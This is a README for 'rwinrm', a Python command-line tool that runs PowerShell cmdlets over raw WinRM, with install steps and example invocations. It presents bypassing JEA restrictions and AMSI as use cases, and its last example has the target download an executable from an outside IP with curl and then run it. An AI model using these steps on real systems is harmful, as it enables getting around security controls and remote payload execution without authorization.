#########
Raw WinRM
#########

| Using WinRM without using Invoke-Command cmdlet
| This project use the pypsrp library : https://github.com/jborean93/pypsrp
|
| Use cases :
- Dealing with powershell JEA limitations (Just Enough Administration)
- AMSI issues with NetExec // Evil-WinRM

|
| You can have a look at this project as well : https://github.com/sashathomas/evil-jea

|

Install
*******

.. code-block:: bash

    pipx install git+https://github.com/charlesgargasson/rwinrm.git@main
    # pipx uninstall rwinrm
    # pipx upgrade rwinrm

|

Usage
*****

.. code-block:: bash

    rwinrm --host IP --user USER --pass PASSWORD -c CMDLET -a ARG -p PARAMETER VALUE

|

Examples
********

.. code-block:: bash

    rwinrm --host 172.16.90.130 --user user --pass Test_1 -c 'Get-Command' 

.. code-block:: bash

    rwinrm --host 172.16.90.130 --user user --pass Test_1 -c 'whoami.exe' 
    [*] => cmdlet: whoami.exe
    [*] Success
    [*] Printing output
    w11\user

    rwinrm --host 172.16.90.130 --user user --pass Test_1 -a 'whoami.exe' 
    [*] => cmdlet: cmd.exe
    [*] -- arg: /c
    [*] -- arg: whoami.exe
    [*] Success
    [*] Printing output
    w11\user

.. code-block:: bash

    rwinrm --host 172.16.90.130 --user user --pass Test_1 -c Get-Process -c Select-Object -a ProcessName -c Out-String -p width 999
    [*] => cmdlet: Get-Process
    [*] => cmdlet: Select-Object
    [*] -- arg: ProcessName
    [*] => cmdlet: Out-String
    [*] -- param: width
    [*] -- value: 999
    [*] Success
    [*] Printing output

    ProcessName            
    -----------            
    AggregatorHost         
    ApplicationFrameHost   
    conhost                
    conhost                
    CrossDeviceService     
    csrss                  
    csrss             
    [...]

.. code-block:: bash

    rwinrm --host 172.16.90.130 --user user --pass Test_1 -c 'curl.exe' -a 'http://192.168.1.21/r.exe' -a '--output' -a 'c:\r\r.exe'
    rwinrm --host 172.16.90.130 --user user --pass Test_1 -c '/r/r.exe' -a '--child'
    [...]

|

Todo
****

| Nested powershell
| Certificate and kerberos support